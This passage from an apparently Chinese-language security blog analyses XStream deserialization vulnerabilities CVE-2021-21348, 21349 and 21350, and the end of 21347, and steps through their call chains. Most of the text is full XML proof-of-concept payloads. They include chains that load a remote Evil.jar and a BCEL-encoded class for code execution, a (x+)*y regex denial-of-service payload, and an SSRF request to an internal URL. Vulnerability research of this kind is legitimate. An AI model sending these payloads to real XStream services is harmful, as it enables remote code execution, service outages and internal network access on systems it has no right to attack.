&lt;url&gt;http://127.0.0.1:80/Evil.jar&lt;/url&gt;</span><br><span class="line">                          &lt;/elementData&gt;</span><br><span class="line">                        &lt;/default&gt;</span><br><span class="line">                      &lt;/vector&gt;</span><br><span class="line">                    &lt;/urls&gt;</span><br><span class="line">                    &lt;path&gt;x</span><br><span class="line">                      &lt;url&gt;http://127.0.0.1:80/Evil.jar&lt;/url&gt;</span><br><span class="line">                    &lt;/path&gt;</span><br><span class="line">                    &lt;loaders/&gt;</span><br><span class="line">                    &lt;lmap/&gt;</span><br><span class="line">                  &lt;/ucp&gt;</span><br><span class="line">                  &lt;package2certs class=&#x27;concurrent-hash-map&#x27;/&gt;</span><br><span class="line">                  &lt;classes/&gt;</span><br><span class="line">                  &lt;defaultDomain&gt;</span><br><span class="line">                    &lt;classloader class=&#x27;java.net.URLClassLoader&#x27; reference=&#x27;../..&#x27;/&gt;</span><br><span class="line">                    &lt;principals/&gt;</span><br><span class="line">                    &lt;hasAllPerm&gt;false&lt;/hasAllPerm&gt;</span><br><span class="line">                    &lt;staticPermissions&gt;false&lt;/staticPermissions&gt;</span><br><span class="line">                    &lt;key&gt;</span><br><span class="line">                      &lt;outer-class reference=&#x27;../..&#x27;/&gt;</span><br><span class="line">                    &lt;/key&gt;</span><br><span class="line">                  &lt;/defaultDomain&gt;</span><br><span class="line">                  &lt;initialized&gt;true&lt;/initialized&gt;</span><br><span class="line">                  &lt;pdcache/&gt;</span><br><span class="line">                &lt;/processorCL&gt;</span><br><span class="line">              &lt;/iterator&gt;</span><br><span class="line">              &lt;type&gt;KEYS&lt;/type&gt;</span><br><span class="line">            &lt;/e&gt;</span><br><span class="line">            &lt;in class=&#x27;java.io.ByteArrayInputStream&#x27;&gt;</span><br><span class="line">              &lt;buf&gt;&lt;/buf&gt;</span><br><span class="line">              &lt;pos&gt;-2147483648&lt;/pos&gt;</span><br><span class="line">              &lt;mark&gt;0&lt;/mark&gt;</span><br><span class="line">              &lt;count&gt;0&lt;/count&gt;</span><br><span class="line">            &lt;/in&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">          &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">        &lt;transferFlavors/&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">      &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">    &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference=&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;/&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>POC非常长，我又优化了一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;javafx.collections.ObservableList$1&#x27;/&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">          &lt;is class=&#x27;java.io.SequenceInputStream&#x27;&gt;</span><br><span class="line">            &lt;e class=&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;&gt;</span><br><span class="line">              &lt;iterator class=&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;&gt;</span><br><span class="line">                &lt;names class=&#x27;java.util.AbstractList$Itr&#x27;&gt;</span><br><span class="line">                  &lt;outer-class class=&#x27;java.util.Arrays$ArrayList&#x27;&gt;</span><br><span class="line">                    &lt;a class=&#x27;string-array&#x27;&gt;</span><br><span class="line">                      &lt;string&gt;Evil&lt;/string&gt;</span><br><span class="line">                    &lt;/a&gt;</span><br><span class="line">                  &lt;/outer-class&gt;</span><br><span class="line">                &lt;/names&gt;</span><br><span class="line">                &lt;processorCL class=&#x27;java.net.URLClassLoader&#x27;&gt;</span><br><span class="line">                  &lt;ucp class=&#x27;sun.misc.URLClassPath&#x27;&gt;</span><br><span class="line">                    &lt;urls serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                      &lt;unserializable-parents/&gt;</span><br><span class="line">                      &lt;vector&gt;</span><br><span class="line">                        &lt;default&gt;</span><br><span class="line">                          &lt;elementCount&gt;1&lt;/elementCount&gt;</span><br><span class="line">                          &lt;elementData&gt;</span><br><span class="line">                            &lt;url&gt;http://127.0.0.1:8080/Evil.jar&lt;/url&gt;</span><br><span class="line">                          &lt;/elementData&gt;</span><br><span class="line">                        &lt;/default&gt;</span><br><span class="line">                      &lt;/vector&gt;</span><br><span class="line">                    &lt;/urls&gt;</span><br><span class="line">                    &lt;loaders/&gt;</span><br><span class="line">                    &lt;lmap/&gt;</span><br><span class="line">                  &lt;/ucp&gt;</span><br><span class="line">                  &lt;package2certs class=&#x27;concurrent-hash-map&#x27;/&gt;</span><br><span class="line">                  &lt;classes/&gt;</span><br><span class="line">                  &lt;initialized&gt;true&lt;/initialized&gt;</span><br><span class="line">                  &lt;pdcache/&gt;</span><br><span class="line">                &lt;/processorCL&gt;</span><br><span class="line">              &lt;/iterator&gt;</span><br><span class="line">            &lt;/e&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">    &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference=&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;/&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>前半部分跟CVE-2020-26217有点相似，入口点由HashMap变成PriorityQueue，之前是由NativeString的toString到的Base64Data的toString，这次由ObservableList$1的compare方法到的Base64Data的toString。</p>
<p>有个细节，xml的这部分：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;names class=&#x27;java.util.AbstractList$Itr&#x27;&gt;</span><br><span class="line">	&lt;outer-class class=&#x27;java.util.Arrays$ArrayList&#x27;&gt;</span><br><span class="line">		&lt;a class=&#x27;string-array&#x27;&gt;</span><br><span class="line">			&lt;string&gt;Evil&lt;/string&gt;</span><br><span class="line">		&lt;/a&gt;</span><br><span class="line">	&lt;/outer-class&gt;</span><br><span class="line">&lt;/names&gt;</span><br></pre></td></tr></table></figure>

<p>声明了names属性为Itr迭代器，同时往外部类（AbstractList）存入了一个字符串数组（之前说过，翻看CVE-2020-26217）。</p>
<p>调用链如下：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101837525.png" alt="image-20230410183729415"></p>
<p>在get方法中，调用了close方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101837011.png" alt="image-20230410183707902"></p>
<p>close方法又调用了nextStream方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101838788.png" alt="image-20230410183804688"></p>
<p>nextStream方法中调用e属性（MultiUIDefaults$MultiUIDefaultsEnumerator）的hasMoreElements方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101838498.png" alt="image-20230410183835413"></p>
<p>接着是 iterator属性（JavacProcessingEnvironment$NameProcessIterator）的hasNext方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101839704.png" alt="image-20230410183936633"></p>
<p>在JavacProcessingEnvironment$NameProcessIterator的hasNext方法中使用URLClassLoader加载远程类并实例化：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304101840604.png" alt="image-20230410184037509"></p>
<h2 id="CVE-2021-21348"><a href="#CVE-2021-21348" class="headerlink" title="CVE-2021-21348"></a>CVE-2021-21348</h2><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>该漏洞会造成正则回朔拒绝服务，当使用重复运算符嵌套时，例如<code>(x+)*y</code>模式，去匹配10个字符的x，先匹配括号里的x（加号代表一个或者多个）再匹配括号外的x（<code>*</code>代表零个或多个），在此期间CPU会不断的回溯匹配，最终会计算17945次而结束匹配，这种正则模式由于会造成CPU的大量计算，而导致拒绝服务漏洞。</p>
<p>官方的POC我又进行了简化，简化后如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;javafx.collections.ObservableList$1&#x27;/&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">          &lt;contentType&gt;text/plain&lt;/contentType&gt;</span><br><span class="line">          &lt;is class=&#x27;java.io.SequenceInputStream&#x27;&gt;</span><br><span class="line">            &lt;e class=&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;&gt;</span><br><span class="line">              &lt;iterator class=&#x27;java.util.Scanner&#x27;&gt;</span><br><span class="line">                &lt;buf class=&#x27;java.nio.HeapCharBuffer&#x27;&gt;</span><br><span class="line">                  &lt;capacity&gt;1024&lt;/capacity&gt;</span><br><span class="line">                  &lt;hb&gt;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&lt;/hb&gt;</span><br><span class="line">                &lt;/buf&gt;</span><br><span class="line">                &lt;matcher&gt;</span><br><span class="line">                  &lt;text class=&#x27;java.nio.HeapCharBuffer&#x27; reference=&#x27;../../buf&#x27;/&gt;</span><br><span class="line">                &lt;/matcher&gt;</span><br><span class="line">                &lt;delimPattern&gt;</span><br><span class="line">                  &lt;pattern&gt;(x+)*y&lt;/pattern&gt;</span><br><span class="line">                  &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">                &lt;/delimPattern&gt;</span><br><span class="line">                &lt;source class=&#x27;java.io.StringReader&#x27;&gt;</span><br><span class="line">                  &lt;lock class=&#x27;java.io.StringReader&#x27; reference=&#x27;..&#x27;/&gt;</span><br><span class="line">                  &lt;str&gt;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&lt;/str&gt;</span><br><span class="line">                  &lt;length&gt;32&lt;/length&gt;</span><br><span class="line">                &lt;/source&gt;</span><br><span class="line">              &lt;/iterator&gt;</span><br><span class="line">            &lt;/e&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">    &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference=&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;/&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>会将source标签里的str标签控制的字符串写入HeapCharBuffer，length标签控制写入长度。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator.hasMoreElements(MultiUIDefaults.java:148)</span><br><span class="line">java.io.SequenceInputStream.nextStream(SequenceInputStream.java:109)</span><br><span class="line">java.io.SequenceInputStream.close(SequenceInputStream.java:232)</span><br><span class="line">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.get(Base64Data.java:183)</span><br><span class="line">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data.toString(Base64Data.java:286)</span><br><span class="line">javafx.collections.ObservableList$1.compare(ObservableList.java:153)</span><br><span class="line">java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)</span><br><span class="line">java.util.PriorityQueue.siftDown(PriorityQueue.java:687)</span><br><span class="line">java.util.PriorityQueue.heapify(PriorityQueue.java:736)</span><br><span class="line">java.util.PriorityQueue.readObject(PriorityQueue.java:796)</span><br></pre></td></tr></table></figure>

<p>从<code>&lt;iterator class=&#39;java.util.Scanner&#39;&gt;</code>开始往下是跟之前利用链所不同的地方，我们直接从不同之处看起：MultiUIDefaultsEnumerator.hasMoreElements()（这之前的调用链如上）</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111134987.png" alt="image-20230411113444924"></p>
<p>在hasNext方法中，进入第二次循环的hasTokenInBuffer方法中（在第一次循环中，进入的hasTokenInBuffer方法会由于HeapCharBuffer的limit属性为0，导致不匹配文本，然后进入readInput方法，从StringReader中读取32个字符x，设置limit为32，然后到第二次循环才会匹配文本）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111138912.png" alt="image-20230411113807848"></p>
<p>在hasTokenInBuffer方法中，设置正则模式，然后调用lookingAt方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111138123.png" alt="image-20230411113837044"></p>
<p>在lookingAt方法调用match，该方法跟matches相似，是用来匹配字符串的：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111142008.png" alt="image-20230411114240939"></p>
<p>在match方法中，使用<code>(x+)*y</code>去匹配32个字符的x，造成ReDos：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111144334.png" alt="image-20230411114424236"></p>
<p>我又改造了下POC，设置limit为32，这样就直接在第一次循环的hasTokenInBuffer方法中触发DOS：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;javafx.collections.ObservableList$1&#x27;/&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">          &lt;contentType&gt;text/plain&lt;/contentType&gt;</span><br><span class="line">          &lt;is class=&#x27;java.io.SequenceInputStream&#x27;&gt;</span><br><span class="line">            &lt;e class=&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;&gt;</span><br><span class="line">              &lt;iterator class=&#x27;java.util.Scanner&#x27;&gt;</span><br><span class="line">                &lt;buf class=&#x27;java.nio.HeapCharBuffer&#x27;&gt;</span><br><span class="line">                  &lt;capacity&gt;1024&lt;/capacity&gt;</span><br><span class="line">                  &lt;hb&gt;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&lt;/hb&gt;</span><br><span class="line">                  &lt;limit&gt;32&lt;/limit&gt;                &lt;/buf&gt;</span><br><span class="line">                &lt;matcher&gt;</span><br><span class="line">                  &lt;text class=&#x27;java.nio.HeapCharBuffer&#x27; reference=&#x27;../../buf&#x27;/&gt;</span><br><span class="line">                &lt;/matcher&gt;</span><br><span class="line">                &lt;delimPattern&gt;</span><br><span class="line">                  &lt;pattern&gt;(x+)*y&lt;/pattern&gt;</span><br><span class="line">                  &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">                &lt;/delimPattern&gt;</span><br><span class="line">              &lt;/iterator&gt;</span><br><span class="line">            &lt;/e&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">    &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference=&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;/&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2021-21349"><a href="#CVE-2021-21349" class="headerlink" title="CVE-2021-21349"></a>CVE-2021-21349</h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><p>该漏洞会造成SSRF，经简化后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;javafx.collections.ObservableList$1&#x27;/&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">          &lt;is class=&#x27;java.io.SequenceInputStream&#x27;&gt;</span><br><span class="line">            &lt;e class=&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;&gt;</span><br><span class="line">              &lt;iterator class=&#x27;com.sun.xml.internal.ws.util.ServiceFinder$ServiceNameIterator&#x27;&gt;</span><br><span class="line">                &lt;configs class=&#x27;sun.misc.FIFOQueueEnumerator&#x27;&gt;</span><br><span class="line">                  &lt;queue&gt;</span><br><span class="line">                    &lt;length&gt;1&lt;/length&gt;</span><br><span class="line">                    &lt;head&gt;</span><br><span class="line">                      &lt;obj class=&#x27;url&#x27;&gt;http://localhost:8080/internal/&lt;/obj&gt;</span><br><span class="line">                    &lt;/head&gt;</span><br><span class="line">                  &lt;/queue&gt;</span><br><span class="line">                  &lt;cursor reference=&#x27;../queue/head&#x27;/&gt;</span><br><span class="line">                &lt;/configs&gt;</span><br><span class="line">                &lt;returned class=&#x27;sorted-set&#x27;/&gt;</span><br><span class="line">              &lt;/iterator&gt;</span><br><span class="line">              &lt;type&gt;KEYS&lt;/type&gt;</span><br><span class="line">            &lt;/e&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">    &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference=&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;/&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>上半部分跟21348一模一样，同样也是从MultiUIDefaultsEnumerator.hasMoreElements()（这之前的调用链如上）看起：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111435049.png" alt="image-20230411143523946"></p>
<p>在hasNext方法中，取出configs属性的下一个元素，然后调用ServiceFinder的parse方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111436681.png" alt="image-20230411143625595"></p>
<p>在parse方法中，直接发起URL请求：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304111437026.png" alt="image-20230411143725935"></p>
<h2 id="CVE-2021-21350"><a href="#CVE-2021-21350" class="headerlink" title="CVE-2021-21350"></a>CVE-2021-21350</h2><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><p>官方POC为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;javafx.collections.ObservableList$1&#x27;/&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">          &lt;contentType&gt;text/plain&lt;/contentType&gt;</span><br><span class="line">          &lt;is class=&#x27;java.io.SequenceInputStream&#x27;&gt;</span><br><span class="line">            &lt;e class=&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;&gt;</span><br><span class="line">              &lt;iterator class=&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;&gt;</span><br><span class="line">                &lt;names class=&#x27;java.util.AbstractList$Itr&#x27;&gt;</span><br><span class="line">                  &lt;cursor&gt;0&lt;/cursor&gt;</span><br><span class="line">                  &lt;lastRet&gt;-1&lt;/lastRet&gt;</span><br><span class="line">                  &lt;expectedModCount&gt;0&lt;/expectedModCount&gt;</span><br><span class="line">                  &lt;outer-class class=&#x27;java.util.Arrays$ArrayList&#x27;&gt;</span><br><span class="line">                    &lt;a class=&#x27;string-array&#x27;&gt;</span><br><span class="line">                      &lt;string&gt;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$ddN$c20$Y$3d$85$c9$60$O$e5G$fcW$f0J0Qn$bc$c3$Y$T$83$89$c9$oF$M$5e$97$d9$60$c9X$c9$d6$R$5e$cb$h5$5e$f8$A$3e$94$f1$x$g$q$b1MwrN$cf$f9$be$b6$fb$fcz$ff$Ap$8a$aa$83$MJ$O$caX$cb$a2bp$dd$c6$86$8dM$86$cc$99$M$a5$3egH$d7$h$3d$G$ebR$3d$K$86UO$86$e2$s$Z$f5Et$cf$fb$B$v$rO$f9$3c$e8$f1H$g$fe$xZ$faI$c6T$c3kOd$d0bp$daS_$8c$b5Talc$8bxW$r$91$_$ae$a41$e7$8c$e9d$c8$t$dc$85$8d$ac$8dm$X$3b$d8$a5$d2j$y$c2$da1$afQ$D$3f$J$b8V$91$8b$3d$ecS$7d$Ta$u$98P3$e0$e1$a0$d9$e9$P$85$af$Z$ca3I$aa$e6ug$de$93$a1$f8g$bcKB$zG$d4$d6$Z$I$3d$t$95z$c3$fb$e7$a1$83$5bb$w$7c$86$c3$fa$c2nWG2$i$b4$W$D$b7$91$f2E$i$b7p$80$rzQ3$YM$ba$NR$c8$R$bb$md$84$xG$af$60oH$95$d2$_$b0$k$9eII$c11$3a$d2$f4$cd$c2$ow$9e$94eb$eeO$820$3fC$d0$$$fd$BZ$85Y$ae$f8$N$93$85$cf$5c$c7$B$A$A&lt;/string&gt;</span><br><span class="line">                    &lt;/a&gt;</span><br><span class="line">                  &lt;/outer-class&gt;</span><br><span class="line">                &lt;/names&gt;</span><br><span class="line">                &lt;processorCL class=&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;&gt;</span><br><span class="line">                  &lt;parent class=&#x27;sun.misc.Launcher$ExtClassLoader&#x27;&gt;</span><br><span class="line">                  &lt;/parent&gt;</span><br><span class="line">                  &lt;package2certs class=&#x27;hashtable&#x27;/&gt;</span><br><span class="line">                  &lt;classes defined-in=&#x27;java.lang.ClassLoader&#x27;/&gt;</span><br><span class="line">                  &lt;defaultDomain&gt;</span><br><span class="line">                    &lt;classloader class=&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27; reference=&#x27;../..&#x27;/&gt;</span><br><span class="line">                    &lt;principals/&gt;</span><br><span class="line">                    &lt;hasAllPerm&gt;false&lt;/hasAllPerm&gt;</span><br><span class="line">                    &lt;staticPermissions&gt;false&lt;/staticPermissions&gt;</span><br><span class="line">                    &lt;key&gt;</span><br><span class="line">                      &lt;outer-class reference=&#x27;../..&#x27;/&gt;</span><br><span class="line">                    &lt;/key&gt;</span><br><span class="line">                  &lt;/defaultDomain&gt;</span><br><span class="line">                  &lt;packages/&gt;</span><br><span class="line">                  &lt;nativeLibraries/&gt;</span><br><span class="line">                  &lt;assertionLock class=&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27; reference=&#x27;..&#x27;/&gt;</span><br><span class="line">                  &lt;defaultAssertionStatus&gt;false&lt;/defaultAssertionStatus&gt;</span><br><span class="line">                  &lt;classes/&gt;</span><br><span class="line">                  &lt;ignored__packages&gt;</span><br><span class="line">                    &lt;string&gt;java.&lt;/string&gt;</span><br><span class="line">                    &lt;string&gt;javax.&lt;/string&gt;</span><br><span class="line">                    &lt;string&gt;sun.&lt;/string&gt;</span><br><span class="line">                  &lt;/ignored__packages&gt;</span><br><span class="line">                  &lt;repository class=&#x27;com.sun.org.apache.bcel.internal.util.SyntheticRepository&#x27;&gt;</span><br><span class="line">                    &lt;__path&gt;</span><br><span class="line">                      &lt;paths/&gt;</span><br><span class="line">                      &lt;class__path&gt;.&lt;/class__path&gt;</span><br><span class="line">                    &lt;/__path&gt;</span><br><span class="line">                    &lt;__loadedClasses/&gt;</span><br><span class="line">                  &lt;/repository&gt;</span><br><span class="line">                  &lt;deferTo class=&#x27;sun.misc.Launcher$ExtClassLoader&#x27; reference=&#x27;../parent&#x27;/&gt;</span><br><span class="line">                &lt;/processorCL&gt;</span><br><span class="line">              &lt;/iterator&gt;</span><br><span class="line">              &lt;type&gt;KEYS&lt;/type&gt;</span><br><span class="line">            &lt;/e&gt;</span><br><span class="line">            &lt;in class=&#x27;java.io.ByteArrayInputStream&#x27;&gt;</span><br><span class="line">              &lt;buf&gt;&lt;/buf&gt;</span><br><span class="line">              &lt;pos&gt;0&lt;/pos&gt;</span><br><span class="line">              &lt;mark&gt;0&lt;/mark&gt;</span><br><span class="line">              &lt;count&gt;0&lt;/count&gt;</span><br><span class="line">            &lt;/in&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">          &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">        &lt;transferFlavors/&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">      &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">    &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference=&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;/&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>链与CVE-2021-21347的原理相同，只不过使用的类加载器不同，这里使用的BCEL类加载器，如果是Windows用户则string标签的内容替换成下面：</p>
